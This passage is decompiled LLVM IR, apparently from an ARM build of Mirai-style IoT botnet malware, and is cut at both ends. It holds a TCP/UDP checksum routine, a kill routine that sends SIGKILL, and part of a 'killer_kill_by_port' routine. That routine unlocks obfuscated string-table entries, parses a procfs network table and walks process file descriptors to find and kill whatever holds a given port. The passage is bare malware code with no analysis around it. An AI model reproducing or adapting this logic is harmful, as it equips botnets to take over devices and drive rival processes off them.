  %v4_c8b4 = zext i8 %v3_c8b4 to i32
  %v3_c8b8 = add i32 %v1_c8b8, %v4_c8b4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c8b0, %bb
  %v0_c8bc = phi i32 [ %v1_c8b8, %dec_label_pc_c8b0 ], [ %v3_c8b8, %bb ]
  %v3_c8c0 = urem i32 %v0_c8bc, 65536
  %v4_c8c4 = udiv i32 %v0_c8bc, 65536
  %v5_c8c4 = add nuw nsw i32 %v4_c8c4, %v3_c8c0
  %v4_c8c8 = udiv i32 %v5_c8c4, 65536
  %v5_c8c8 = add nuw nsw i32 %v4_c8c8, %v5_c8c4
  %v1_c8cc = urem i32 %v5_c8c8, 65536
  %v3_c8d4 = xor i32 %v1_c8cc, 65535
  ret i32 %v3_c8d4

; uselistorder directives
  uselistorder i32 %v5_c8c4, { 1, 0 }
  uselistorder i32 %v5_c8a0, { 1, 0 }
  uselistorder i32 %v1_c89c, { 1, 0, 2 }
  uselistorder i32 %v0_c8a0, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_c8b0, { 1, 0 }
}

define i32 @checksum_tcpudp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_c8ec = add i32 %arg1, 12
  %v2_c8ec = inttoptr i32 %v1_c8ec to i32*
  %v3_c8ec = load i32, i32* %v2_c8ec, align 4
  %v1_c8f0 = add i32 %arg1, 16
  %v2_c8f0 = inttoptr i32 %v1_c8f0 to i32*
  %v3_c8f0 = load i32, i32* %v2_c8f0, align 4
  %v7_c8f4 = icmp sgt i32 %arg3, 1
  br i1 %v7_c8f4, label %dec_label_pc_c900.preheader, label %dec_label_pc_c914

dec_label_pc_c900.preheader:                      ; preds = %entry
  %v0_c904.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_c900

dec_label_pc_c900:                                ; preds = %dec_label_pc_c900.preheader, %dec_label_pc_c900
  %v0_c90c = phi i32 [ 0, %dec_label_pc_c900.preheader ], [ %v2_c90c, %dec_label_pc_c900 ]
  %v0_c904 = phi i32 [ %v0_c904.pre, %dec_label_pc_c900.preheader ], [ %v5_c904, %dec_label_pc_c900 ]
  %v0_c900 = phi i32 [ %arg3, %dec_label_pc_c900.preheader ], [ %v1_c900, %dec_label_pc_c900 ]
  %v1_c900 = add nsw i32 %v0_c900, -2
  %v1_c904 = inttoptr i32 %v0_c904 to i16*
  %v2_c904 = load i16, i16* %v1_c904, align 2
  %v3_c904 = zext i16 %v2_c904 to i32
  %v5_c904 = add i32 %v0_c904, -2
  store i32 %v5_c904, i32* @r1, align 4
  %v2_c90c = add i32 %v3_c904, %v0_c90c
  %v8_c910 = icmp sgt i32 %v1_c900, 1
  br i1 %v8_c910, label %dec_label_pc_c900, label %dec_label_pc_c914.loopexit

dec_label_pc_c914.loopexit:                       ; preds = %dec_label_pc_c900
  br label %dec_label_pc_c914

dec_label_pc_c914:                                ; preds = %dec_label_pc_c914.loopexit, %entry
  %v1_c920 = phi i32 [ %v2_c90c, %dec_label_pc_c914.loopexit ], [ 0, %entry ]
  %v0_c914 = phi i32 [ %v1_c900, %dec_label_pc_c914.loopexit ], [ %arg3, %entry ]
  %v7_c914 = icmp eq i32 %v0_c914, 1
  br i1 %v7_c914, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_c914
  br label %bb19

bb:                                               ; preds = %dec_label_pc_c914
  %v1_c918 = load i32, i32* @r1, align 4
  %v2_c918 = inttoptr i32 %v1_c918 to i8*
  %v3_c918 = load i8, i8* %v2_c918, align 1
  %v4_c918 = zext i8 %v3_c918 to i32
  %v3_c920 = add i32 %v4_c918, %v1_c920
  br label %bb19

bb19:                                             ; preds = %.thread, %bb
  %v1_c948 = phi i32 [ %v1_c920, %.thread ], [ %v3_c920, %bb ]
  %v0_c928 = mul i32 %v3_c8ec, 65536
  %v3_c928 = udiv i32 %v0_c928, 65536
  %v3_c92c = urem i32 %v3_c8f0, 65536
  %v4_c934 = udiv i32 %v3_c8ec, 65536
  %v2_c930 = add nuw nsw i32 %v3_c92c, %v4_c934
  %v5_c934 = add nuw nsw i32 %v2_c930, %v3_c928
  %v1_c938 = add i32 %arg1, 9
  %v2_c938 = inttoptr i32 %v1_c938 to i8*
  %v3_c938 = load i8, i8* %v2_c938, align 1
  %v4_c938 = zext i8 %v3_c938 to i32
  %v4_c93c = udiv i32 %v3_c8f0, 65536
  %v3_c944 = mul nuw nsw i32 %v4_c938, 256
  %v5_c93c = add i32 %v4_c93c, %arg2
  %v2_c940 = add i32 %v5_c93c, %v1_c948
  %v2_c948 = add i32 %v2_c940, %v5_c934
  %v2_c94c = add i32 %v2_c948, %v3_c944
  %tmp = icmp ult i32 %v2_c94c, 65536
  br i1 %tmp, label %dec_label_pc_c96c, label %dec_label_pc_c958

dec_label_pc_c958:                                ; preds = %bb19, %dec_label_pc_c958
  %v2_c9605 = phi i32 [ %v2_c960, %dec_label_pc_c958 ], [ %v2_c94c, %bb19 ]
  %v3_c9646.in = phi i32 [ %v2_c960, %dec_label_pc_c958 ], [ %v2_c94c, %bb19 ]
  %v3_c9646 = udiv i32 %v3_c9646.in, 65536
  %v3_c95c = urem i32 %v2_c9605, 65536
  %v2_c960 = add nuw nsw i32 %v3_c95c, %v3_c9646
  %tmp20 = icmp ult i32 %v2_c960, 65536
  br i1 %tmp20, label %dec_label_pc_c96c.loopexit, label %dec_label_pc_c958

dec_label_pc_c96c.loopexit:                       ; preds = %dec_label_pc_c958
  br label %dec_label_pc_c96c

dec_label_pc_c96c:                                ; preds = %dec_label_pc_c96c.loopexit, %bb19
  %v0_c96c = phi i32 [ %v2_c960, %dec_label_pc_c96c.loopexit ], [ %v2_c94c, %bb19 ]
  %v1_c96c = urem i32 %v0_c96c, 65536
  %v3_c974 = xor i32 %v1_c96c, 65535
  ret i32 %v3_c974

; uselistorder directives
  uselistorder i32 %v2_c960, { 2, 1, 3, 0 }
  uselistorder i32 %v2_c94c, { 3, 0, 2, 1 }
  uselistorder i32 %v1_c920, { 1, 0 }
  uselistorder i32 %v5_c904, { 1, 0 }
  uselistorder i32 %v0_c904, { 1, 0 }
  uselistorder i32 %v3_c8ec, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_c958, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_c900, { 1, 0 }
}

define i32 @killer_kill(i32 %arg1) local_unnamed_addr {
entry:
  %v2_c98c = load i32, i32* @global_var_24f80.71, align 4
  %v2_c994 = call i32 @kill(i32 %v2_c98c, i32 9)
  ret i32 %v2_c994
}

define i32 @killer_kill_by_port(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-4681 = alloca i32, align 4
  %stack_var_-8777 = alloca i32, align 4
  %stack_var_-585 = alloca i8, align 1
  %v3_c9a8 = load i32, i32* @r4, align 4
  %v6_c9a8 = load i32, i32* @r5, align 4
  %v9_c9a8 = load i32, i32* @r6, align 4
  %v12_c9a8 = load i32, i32* @r7, align 4
  %v15_c9a8 = load i32, i32* @r8, align 4
  %v18_c9a8 = load i32, i32* @sb, align 4
  %v21_c9a8 = load i32, i32* @sl, align 4
  %v24_c9a8 = load i32, i32* @fp, align 4
  %v27_c9a8 = load i32, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  %v2_c9c4 = ptrtoint i8* %stack_var_-585 to i32
  store i32 %v2_c9c4, i32* @r6, align 4
  store i32 0, i32* %stack_var_-56, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_c9f0 = ptrtoint i32* %stack_var_-8777 to i32
  store i32 %v2_c9f0, i32* @fp, align 4
  %v4_c9fc = call i32 @__GI_memset(i8* nonnull %stack_var_-585, i32 0, i32 513)
  %v2_ca00 = ptrtoint i32* %stack_var_-4681 to i32
  store i32 %v2_ca00, i32* @sl, align 4
  %v0_ca04 = load i32, i32* @r5, align 4
  %v3_ca10 = bitcast i32* %stack_var_-8777 to i8*
  %v4_ca10 = call i32 @__GI_memset(i8* %v3_ca10, i32 %v0_ca04, i32 4096)
  %v0_ca18 = load i32, i32* @r5, align 4
  %v3_ca24 = bitcast i32* %stack_var_-4681 to i8*
  %v4_ca24 = call i32 @__GI_memset(i8* %v3_ca24, i32 %v0_ca18, i32 4096)
  %v2_ca28 = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_ca28, i32* @sb, align 4
  %v0_ca2c = load i32, i32* %r4.global-to-local, align 4
  %v3_ca2c = udiv i32 %v0_ca2c, 256
  %v1_ca30 = urem i32 %v0_ca2c, 256
  store i32 %v1_ca30, i32* @r4, align 4
  %v3_ca40 = trunc i32 %v3_ca2c to i8
  %v4_ca40 = call i32 @util_itoa(i8 %v3_ca40, i32 16, i32 %v2_ca28)
  %v2_ca48 = call i32 @util_strlen(i8* nonnull %stack_var_-72)
  %v7_ca4c = icmp eq i32 %v2_ca48, 2
  br i1 %v7_ca4c, label %dec_label_pc_cf10, label %dec_label_pc_ca54

dec_label_pc_ca54:                                ; preds = %entry, %dec_label_pc_cf10
  %v1_ca58 = call i32 @table_unlock_val(i32 15)
  %v1_ca60 = call i32 @table_unlock_val(i32 16)
  %v1_ca68 = call i32 @table_unlock_val(i32 17)
  %v1_ca70 = call i32 @table_unlock_val(i32 19)
  %v0_ca74 = load i32, i32* @r5, align 4
  %v2_ca7c = inttoptr i32 %v0_ca74 to i32*
  %v3_ca7c = call i32 @table_retrieve_val(i32 19, i32* %v2_ca7c)
  %v0_ca80 = load i32, i32* @r5, align 4
  %v2_ca84 = call i32 @__libc_open(i32 %v3_ca7c, i32 %v0_ca80)
  %v7_ca88 = icmp eq i32 %v2_ca84, -1
  store i32 %v2_ca84, i32* @r8, align 4
  br i1 %v7_ca88, label %bb, label %dec_label_pc_ca98.preheader

bb:                                               ; preds = %dec_label_pc_ca54
  %v1_ca90 = load i32, i32* @r5, align 4
  store i32 %v1_ca90, i32* @r4, align 4
  br label %dec_label_pc_ceac

dec_label_pc_ca98.preheader:                      ; preds = %dec_label_pc_ca54
  %v4_caa456 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v2_ca84)
  %v2_caa858 = icmp eq i32 %v4_caa456, 0
  br i1 %v2_caa858, label %dec_label_pc_cc30.loopexit, label %dec_label_pc_cab0.lr.ph

dec_label_pc_cab0.lr.ph:                          ; preds = %dec_label_pc_ca98.preheader
  %v2_caf8 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_cab0

dec_label_pc_cab0:                                ; preds = %dec_label_pc_cab0.lr.ph, %dec_label_pc_ca98.backedge
  %v3_cab4 = load i8, i8* %stack_var_-585, align 1
  %v4_cab4 = sext i8 %v3_cab4 to i32
  store i32 %v4_cab4, i32* @r3, align 4
  %v2_cab8 = icmp eq i8 %v3_cab4, 0
  br i1 %v2_cab8, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_cab0
  %v8_cabc = icmp eq i8 %v3_cab4, 58
  br i1 %v8_cabc, label %.thread8, label %dec_label_pc_cad0

.thread8:                                         ; preds = %bb125
  br label %dec_label_pc_cae8

bb126:                                            ; preds = %dec_label_pc_cab0
  br label %dec_label_pc_cae8

dec_label_pc_cad0:                                ; preds = %bb125
  %v1_cad8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_cad4

dec_label_pc_cad4:                                ; preds = %bb127, %dec_label_pc_cad0
  %v0_cad4 = phi i32 [ %v1_cad4, %bb127 ], [ 0, %dec_label_pc_cad0 ]
  %v1_cad4 = add i32 %v0_cad4, 1
  %v2_cad8 = add i32 %v1_cad4, %v1_cad8.pre
  %v3_cad8 = inttoptr i32 %v2_cad8 to i8*
  %v4_cad8 = load i8, i8* %v3_cad8, align 1
  %v6_cad8 = zext i8 %v4_cad8 to i32
  store i32 %v6_cad8, i32* @r3, align 4
  %v2_cadc = icmp eq i8 %v4_cad8, 0
  br i1 %v2_cadc, label %dec_label_pc_cae8, label %bb127

bb127:                                            ; preds = %dec_label_pc_cad4
  %v8_cae0 = icmp eq i8 %v4_cad8, 58
  br i1 %v8_cae0, label %dec_label_pc_cae8, label %dec_label_pc_cad4

dec_label_pc_cae8:                                ; preds = %dec_label_pc_cad4, %bb127, %bb126, %.thread8
  %v1_cb14 = phi i32 [ 0, %.thread8 ], [ 0, %bb126 ], [ %v1_cad4, %bb127 ], [ %v1_cad4, %dec_label_pc_cad4 ]
  %v0_cae8 = phi i32 [ %v4_cab4, %.thread8 ], [ %v4_cab4, %bb126 ], [ %v6_cad8, %bb127 ], [ %v6_cad8, %dec_label_pc_cad4 ]
  %v2_cae8 = icmp eq i32 %v0_cae8, 0
  br i1 %v2_cae8, label %dec_label_pc_ca98.backedge, label %dec_label_pc_caf0

dec_label_pc_ca98.backedge:                       ; preds = %dec_label_pc_cae8, %dec_label_pc_cbb8, %dec_label_pc_cc04, %dec_label_pc_cb34
  %v0_caa0 = load i32, i32* @r8, align 4
  %v4_caa4 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v0_caa0)
  %v2_caa8 = icmp eq i32 %v4_caa4, 0
  br i1 %v2_caa8, label %dec_label_pc_cc30.loopexit, label %dec_label_pc_cab0

dec_label_pc_caf0:                                ; preds = %dec_label_pc_cae8
  %v1_caf4 = add i32 %v1_cb14, 2
  %v2_cafc = add i32 %v1_caf4, %v2_caf8
  %v1_cb00 = add i32 %v2_cafc, -545
  %v2_cb00 = inttoptr i32 %v1_cb00 to i8*
  %v3_cb00 = load i8, i8* %v2_cb00, align 1
  %v2_cb04 = icmp eq i8 %v3_cb00, 0
  br i1 %v2_cb04, label %bb129, label %bb128

bb128:                                            ; preds = %dec_label_pc_caf0
  %v8_cb08 = icmp eq i8 %v3_cb00, 32
  br i1 %v8_cb08, label %.thread13, label %dec_label_pc_cb14

.thread13:                                        ; preds = %bb128
  store i32 %v1_caf4, i32* @r5, align 4
  br label %dec_label_pc_cb34

bb129:                                            ; preds = %dec_label_pc_caf0
  store i32 %v1_caf4, i32* @r5, align 4
  br label %dec_label_pc_cb34

dec_label_pc_cb14:                                ; preds = %bb128
  %v0_cb14 = load i32, i32* @r6, align 4
  %v2_cb14 = add i32 %v0_cb14, %v1_cb14
  br label %dec_label_pc_cb1c

dec_label_pc_cb1c:                                ; preds = %bb130, %dec_label_pc_cb14
  %v0_cb2816 = phi i32 [ %v1_cb28, %bb130 ], [ %v1_caf4, %dec_label_pc_cb14 ]
  %v0_cb2c18 = phi i32 [ %v1_cb2c, %bb130 ], [ %v2_cb14, %dec_label_pc_cb14 ]
  %v1_cb1c = add i32 %v0_cb2c18, 3
  %v2_cb1c = inttoptr i32 %v1_cb1c to i8*
  %v3_cb1c = load i8, i8* %v2_cb1c, align 1
  %v2_cb20 = icmp eq i8 %v3_cb1c, 0
  br i1 %v2_cb20, label %.thread15, label %bb130

.thread15:                                        ; preds = %dec_label_pc_cb1c
  %v1_cb2817 = add i32 %v0_cb2816, 1
  store i32 %v1_cb2817, i32* @r5, align 4
  br label %dec_label_pc_cb34

bb130:                                            ; preds = %dec_label_pc_cb1c
  %v8_cb24 = icmp eq i8 %v3_cb1c, 32
  %v1_cb28 = add i32 %v0_cb2816, 1
  store i32 %v1_cb28, i32* @r5, align 4
  %v1_cb2c = add i32 %v0_cb2c18, 1
  br i1 %v8_cb24, label %dec_label_pc_cb34, label %dec_label_pc_cb1c

dec_label_pc_cb34:                                ; preds = %bb130, %bb129, %.thread15, %.thread13
  %v1_cb40 = phi i32 [ %v1_cb2817, %.thread15 ], [ %v1_caf4, %.thread13 ], [ %v1_caf4, %bb129 ], [ %v1_cb28, %bb130 ]
  %v0_cb34 = load i32, i32* @r6, align 4
  %v2_cb34 = add i32 %v0_cb34, %v1_caf4
  store i32 %v2_cb34, i32* @r4, align 4
  %v2_cb40 = add i32 %v1_cb40, %v2_caf8
  store i32 0, i32* @r7, align 4
  %v3_cb48 = add i32 %v2_cb40, -545
  %v4_cb48 = inttoptr i32 %v3_cb48 to i8*
  store i8 0, i8* %v4_cb48, align 1
  %v0_cb4c = load i32, i32* @r4, align 4
  %v1_cb50 = inttoptr i32 %v0_cb4c to i8*
  %v2_cb50 = call i32 @util_strlen(i8* %v1_cb50)
  store i32 %v2_cb50, i32* @r1, align 4
  %v0_cb5c = load i32, i32* @r4, align 4
  %v3_cb60 = inttoptr i32 %v0_cb5c to i8*
  %v4_cb60 = call i32 @util_stristr(i8* %v3_cb60, i32 %v2_cb50, i32 %v2_ca28)
  %v7_cb64 = icmp eq i32 %v4_cb60, -1
  br i1 %v7_cb64, label %dec_label_pc_ca98.backedge, label %dec_label_pc_cb80.preheader

dec_label_pc_cb80.preheader:                      ; preds = %dec_label_pc_cb34
  %v1_cb68 = load i32, i32* @r7, align 4
  %v1_cb6c = load i32, i32* @r6, align 4
  %v2_cb6c = load i32, i32* @r5, align 4
  %v3_cb6c = add i32 %v2_cb6c, %v1_cb6c
  store i32 %v1_cb68, i32* @lr, align 4
  %v1_cb8048 = add i32 %v3_cb6c, 2
  %v2_cb8049 = inttoptr i32 %v1_cb8048 to i8*
  %v3_cb8050 = load i8, i8* %v2_cb8049, align 1
  %v4_cb8051 = zext i8 %v3_cb8050 to i32
  store i32 %v4_cb8051, i32* @r3, align 4
  %v2_cb8452 = icmp eq i8 %v3_cb8050, 0
  %v1_cb8854 = add i32 %v2_cb6c, 2
  br i1 %v2_cb8452, label %dec_label_pc_cbb8, label %dec_label_pc_cb90

dec_label_pc_cb90:                                ; preds = %dec_label_pc_cb80.preheader, %dec_label_pc_cb80.backedge
  %v0_cbb883 = phi i32 [ %v0_cbb881, %dec_label_pc_cb80.backedge ], [ %v1_cb68, %dec_label_pc_cb80.preheader ]
  %v0_cba0.pr = phi i32 [ %v0_cba0.pr70, %dec_label_pc_cb80.backedge ], [ %v1_cb68, %dec_label_pc_cb80.preheader ]
  %v0_cec0 = phi i32 [ %v0_cec073, %dec_label_pc_cb80.backedge ], [ %v1_cb68, %dec_label_pc_cb80.preheader ]
  %v0_cb8878 = phi i32 [ %v1_cb88, %dec_label_pc_cb80.backedge ], [ %v1_cb8854, %dec_label_pc_cb80.preheader ]
  %v0_cbb0 = phi i32 [ %v0_cb80, %dec_label_pc_cb80.backedge ], [ %v3_cb6c, %dec_label_pc_cb80.preheader ]
  %v1_cb94 = phi i32 [ %v4_cb80, %dec_label_pc_cb80.backedge ], [ %v4_cb8051, %dec_label_pc_cb80.preheader ]
  %v7_cb90 = icmp eq i32 %v1_cb94, 9
  br i1 %v7_cb90, label %bb132, label %bb131

bb131:                                            ; preds = %dec_label_pc_cb90
  %v8_cb94 = icmp eq i32 %v1_cb94, 32
  br i1 %v8_cb94, label %.thread27, label %dec_label_pc_cba0

.thread27:                                        ; preds = %bb131
  br label %dec_label_pc_cbac

bb132:                                            ; preds = %dec_label_pc_cb90
  br label %dec_label_pc_cbac

dec_label_pc_cba0:                                ; preds = %bb131
  %v7_cba0 = icmp eq i32 %v0_cba0.pr, 1
  br i1 %v7_cba0, label %dec_label_pc_cec0, label %dec_label_pc_cba8

dec_label_pc_cba8:                                ; preds = %dec_label_pc_cec0, %dec_label_pc_cba0
  %v0_cbac75 = phi i32 [ %v1_cec0, %dec_label_pc_cec0 ], [ %v0_cec0, %dec_label_pc_cba0 ]
  br label %dec_label_pc_cbac

dec_label_pc_cbac:                                ; preds = %bb132, %.thread27, %dec_label_pc_cba8
  %v0_cbac = phi i32 [ %v0_cec0, %.thread27 ], [ %v0_cec0, %bb132 ], [ %v0_cbac75, %dec_label_pc_cba8 ]
  %v0_cba0.pr71 = phi i32 [ 1, %.thread27 ], [ 1, %bb132 ], [ 0, %dec_label_pc_cba8 ]
  %v7_cbb4 = icmp sgt i32 %v0_cbac, 6
  br i1 %v7_cbb4, label %dec_label_pc_cbb8, label %dec_label_pc_cb80.backedge

dec_label_pc_cbb8:                                ; preds = %dec_label_pc_cb80.backedge, %dec_label_pc_cbac, %dec_label_pc_cb80.preheader
  %v1_cc08 = phi i32 [ %v1_cb8854, %dec_label_pc_cb80.preheader ], [ %v1_cb88, %dec_label_pc_cb80.backedge ], [ %v0_cb8878, %dec_label_pc_cbac ]
  %v0_cbb8 = phi i32 [ %v1_cb68, %dec_label_pc_cb80.preheader ], [ %v0_cbb881, %dec_label_pc_cb80.backedge ], [ %v0_cbb883, %dec_label_pc_cbac ]
  %v2_cbb8 = icmp eq i32 %v0_cbb8, 0
  br i1 %v2_cbb8, label %dec_label_pc_ca98.backedge, label %dec_label_pc_cbc4

dec_label_pc_cbc4:                                ; preds = %dec_label_pc_cbb8
  %v2_cbcc = add i32 %v1_cc08, %v2_caf8
  %v1_cbd0 = add i32 %v2_cbcc, -545
  %v2_cbd0 = inttoptr i32 %v1_cbd0 to i8*
  %v3_cbd0 = load i8, i8* %v2_cbd0, align 1
  %v2_cbd4 = icmp eq i8 %v3_cbd0, 0
  br i1 %v2_cbd4, label %dec_label_pc_cc04, label %bb133

bb133:                                            ; preds = %dec_label_pc_cbc4
  %v8_cbd8 = icmp eq i8 %v3_cbd0, 32
  br i1 %v8_cbd8, label %dec_label_pc_cc04, label %dec_label_pc_cbe0

dec_label_pc_cbe0:                                ; preds = %bb133
  %v2_cbe0 = add i32 %v1_cc08, %v1_cb6c
  br label %dec_label_pc_cbe4

dec_label_pc_cbe4:                                ; preds = %bb134, %dec_label_pc_cbe0
  %v0_cbf030 = phi i32 [ %v1_cbf0, %bb134 ], [ %v1_cc08, %dec_label_pc_cbe0 ]
  %v0_cbe4 = phi i32 [ %v1_cbe4, %bb134 ], [ %v2_cbe0, %dec_label_pc_cbe0 ]
  %v1_cbe4 = add i32 %v0_cbe4, 1
  %v2_cbe4 = inttoptr i32 %v1_cbe4 to i8*
  %v3_cbe4 = load i8, i8* %v2_cbe4, align 1
  %v2_cbe8 = icmp eq i8 %v3_cbe4, 0
  br i1 %v2_cbe8, label %.thread29, label %bb134

.thread29:                                        ; preds = %dec_label_pc_cbe4
  %v1_cbf031 = add i32 %v0_cbf030, 1
  br label %dec_label_pc_cbf8

bb134:                                            ; preds = %dec_label_pc_cbe4
  %v8_cbec = icmp eq i8 %v3_cbe4, 32
  %v1_cbf0 = add i32 %v0_cbf030, 1
  br i1 %v8_cbec, label %dec_label_pc_cbf8, label %dec_label_pc_cbe4

dec_label_pc_cbf8:                                ; preds = %bb134, %.thread29
  %v1_cc00 = phi i32 [ %v1_cbf031, %.thread29 ], [ %v1_cbf0, %bb134 ]
  %v2_cc00 = add i32 %v1_cc00, %v2_caf8
  br label %dec_label_pc_cc04

dec_label_pc_cc04:                                ; preds = %dec_label_pc_cbc4, %bb133, %dec_label_pc_cbf8
  %v2_cc10 = phi i32 [ %v2_cbcc, %dec_label_pc_cbc4 ], [ %v2_cbcc, %bb133 ], [ %v2_cc00, %dec_label_pc_cbf8 ]
  %v2_cc08 = add i32 %v1_cc08, %v1_cb6c
  store i32 %v2_cc08, i32* @r4, align 4
  %v3_cc10 = add i32 %v2_cc10, -545
  %v4_cc10 = inttoptr i32 %v3_cc10 to i8*
  store i8 0, i8* %v4_cc10, align 1
  %v1_cc14 = inttoptr i32 %v2_cc08 to i8*
  %v2_cc14 = call i32 @util_strlen(i8* %v1_cc14)
  %v8_cc1c = icmp sgt i32 %v2_cc14, 15
  br i1 %v8_cc1c, label %dec_label_pc_ca98.backedge, label %dec_label_pc_cc20

dec_label_pc_cc20:                                ; preds = %dec_label_pc_cc04
  %v0_cc24 = load i32, i32* @r4, align 4
  %v2_cc28 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_cc28, i32* @r0, align 4
  %v2_cc2c = bitcast i32* %stack_var_-56 to i8*
  %v3_cc2c = call i32 @util_strcpy(i8* %v2_cc2c, i32 %v0_cc24)
  br label %dec_label_pc_cc30

dec_label_pc_cc30.loopexit:                       ; preds = %dec_label_pc_ca98.backedge, %dec_label_pc_ca98.preheader
  %.pre = ptrtoint i32* %stack_var_-56 to i32
  %.pre92 = bitcast i32* %stack_var_-56 to i8*
  br label %dec_label_pc_cc30

dec_label_pc_cc30:                                ; preds = %dec_label_pc_cc30.loopexit, %dec_label_pc_cc20
  %v1_cc40.pre-phi = phi i8* [ %.pre92, %dec_label_pc_cc30.loopexit ], [ %v2_cc2c, %dec_label_pc_cc20 ]
  %v2_cc3c.pre-phi = phi i32 [ %.pre, %dec_label_pc_cc30.loopexit ], [ %v2_cc28, %dec_label_pc_cc20 ]
  %v0_cc30 = load i32, i32* @r8, align 4
  %v1_cc34 = call i32 @__GI___libc_close(i32 %v0_cc30)
  %v2_cc40 = call i32 @util_strlen(i8* %v1_cc40.pre-phi)
  store i32 %v2_cc40, i32* @r4, align 4
  %v2_cc44 = icmp eq i32 %v2_cc40, 0
  br i1 %v2_cc44, label %dec_label_pc_ceec, label %dec_label_pc_cc4c

dec_label_pc_cc4c:                                ; preds = %dec_label_pc_cc30
  %v3_cc54 = call i32 @table_retrieve_val(i32 15, i32* null)
  %v1_cc58 = call i32 @__GI_opendir(i32 %v3_cc54)
  store i32 %v1_cc58, i32* @sb, align 4
  %v2_cc5c = icmp eq i32 %v1_cc58, 0
  br i1 %v2_cc5c, label %dec_label_pc_ce8c, label %dec_label_pc_cc6c.preheader

dec_label_pc_cc6c.preheader:                      ; preds = %dec_label_pc_cc4c
  store i32 0, i32* @r5, align 4
  %v1_cc7043 = inttoptr i32 %v1_cc58 to i32*
  %v2_cc7044 = call i32 @__GI_readdir(i32* %v1_cc7043)
  %v2_cc7446 = icmp eq i32 %v2_cc7044, 0
  br i1 %v2_cc7446, label %dec_label_pc_ce80, label %dec_label_pc_cc7c.preheader

dec_label_pc_cc6c.loopexit:                       ; preds = %dec_label_pc_cc84, %dec_label_pc_cc94, %dec_label_pc_cd00
  %v0_cc6c = load i32, i32* @sb, align 4
  %v1_cc70 = inttoptr i32 %v0_cc6c to i32*
  %v2_cc70 = call i32 @__GI_readdir(i32* %v1_cc70)
  %v2_cc74 = icmp eq i32 %v2_cc70, 0
  br i1 %v2_cc74, label %dec_label_pc_ce80, label %dec_label_pc_cc7c.preheader

dec_label_pc_cc7c.preheader:                      ; preds = %dec_label_pc_cc6c.preheader, %dec_label_pc_cc6c.loopexit
  %v0_cc8491 = phi i32 [ %v2_cc70, %dec_label_pc_cc6c.loopexit ], [ %v2_cc7044, %dec_label_pc_cc6c.preheader ]
  br label %dec_label_pc_cc7c

dec_label_pc_cc7c:                                ; preds = %dec_label_pc_cc7c.preheader, %dec_label_pc_ce68
  %v0_cc9c = phi i32 [ %v0_cc8491, %dec_label_pc_cc7c.preheader ], [ %v2_ce74, %dec_label_pc_ce68 ]
  %v0_cc7c = load i32, i32* @r5, align 4
  %v2_cc7c = icmp eq i32 %v0_cc7c, 0
  br i1 %v2_cc7c, label %dec_label_pc_cc84, label %dec_label_pc_ce80

dec_label_pc_cc84:                                ; preds = %dec_label_pc_cc7c
  %v1_cc84 = add i32 %v0_cc9c, 11
  %v2_cc84 = inttoptr i32 %v1_cc84 to i8*
  %v3_cc84 = load i8, i8* %v2_cc84, align 1
  %v4_cc84 = zext i8 %v3_cc84 to i32
  %v1_cc88 = add nsw i32 %v4_cc84, -48
  %tmp = icmp ugt i32 %v1_cc88, 9
  br i1 %tmp, label %dec_label_pc_cc6c.loopexit, label %dec_label_pc_cc94

dec_label_pc_cc94:                                ; preds = %dec_label_pc_cc84
  store i32 %v1_cc84, i32* @r7, align 4
  %v3_cca0 = call i32 @table_retrieve_val(i32 15, i32* null)
  store i32 %v2_ca00, i32* @r0, align 4
  %v3_ccac = call i32 @util_strcpy(i8* %v3_ca24, i32 %v3_cca0)
  %v2_ccb4 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_ccb8 = load i32, i32* @r7, align 4
  %v1_ccbc = load i32, i32* @sl, align 4
  %v2_ccbc = add i32 %v1_ccbc, %v2_ccb4
  store i32 %v2_ccbc, i32* @r0, align 4
  %v2_ccc0 = inttoptr i32 %v2_ccbc to i8*
  %v3_ccc0 = call i32 @util_strcpy(i8* %v2_ccc0, i32 %v0_ccb8)
  %v2_ccc8 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cccc = load i32, i32* @r5, align 4
  store i32 %v2_ccc8, i32* @r4, align 4
  %v2_ccd8 = inttoptr i32 %v0_cccc to i32*
  %v3_ccd8 = call i32 @table_retrieve_val(i32 16, i32* %v2_ccd8)
  %v0_cce0 = load i32, i32* @r4, align 4
  %v1_cce0 = load i32, i32* @sl, align 4
  %v2_cce0 = add i32 %v1_cce0, %v0_cce0
  store i32 %v2_cce0, i32* @r0, align 4
  %v2_cce4 = inttoptr i32 %v2_cce0 to i8*
  %v3_cce4 = call i32 @util_strcpy(i8* %v2_cce4, i32 %v3_ccd8)
  %v3_ccf4 = call i32 @readlink(i32 %v2_ca00, i32 %v2_c9f0, i32 4096)
  %v7_ccf8 = icmp eq i32 %v3_ccf4, -1
  br i1 %v7_ccf8, label %dec_label_pc_cc6c.loopexit, label %dec_label_pc_cd00

dec_label_pc_cd00:                                ; preds = %dec_label_pc_cc94
  %v0_cd00 = load i32, i32* @r5, align 4
  %v2_cd08 = inttoptr i32 %v0_cd00 to i32*
  %v3_cd08 = call i32 @table_retrieve_val(i32 15, i32* %v2_cd08)
  store i32 %v2_ca00, i32* @r0, align 4
  %v3_cd14 = call i32 @util_strcpy(i8* %v3_ca24, i32 %v3_cd08)
